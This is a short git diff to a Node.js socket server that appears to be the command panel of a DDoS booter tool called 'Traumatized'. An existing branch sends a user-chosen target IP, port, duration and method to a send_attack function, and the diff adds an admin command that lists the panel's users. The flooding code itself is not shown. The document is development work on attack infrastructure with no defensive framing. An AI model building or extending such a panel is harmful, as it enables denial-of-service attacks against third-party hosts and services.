@@ -12,6 +12,7 @@ const crud = require("./auth/crud.js");
 const auth = require("./auth/login.js");
 const banners = require("./extra/banners.js");
 const func = require("./extra/functions");
+const admin = require("./auth/admin.js");
 
 const sleep = (milliseconds) => {
     return new Promise(resolve => setTimeout(resolve, milliseconds))
@@ -81,6 +82,13 @@ server.on('connection', function(socket) {
                 let host_time = config.CurrentCMD.arg[3];
                 let host_method = config.CurrentCMD.arg[4];
                 socket.write(await func.send_attack(host_ip, host_port, host_time, host_method) + config.hostname(user_name));
+            } else if(cleanSTR.startsWith("admin")) {
+                let admin_tool = config.CurrentCMD.arg[1];
+                if(admin_tool === "users") {
+                    socket.write(config.Colors.Clear + admin.show_users() + config.hostname(user_name));
+                } else {
+                    socket.write("[x] Invalid admin tool!\r\n" + config.hostname(user_name))
+                }
             } else if(cleanSTR.startsWith("exit")) {
                 socket.write("Closing Traumatized.")
                 socket.write(config.Colors.Clear)
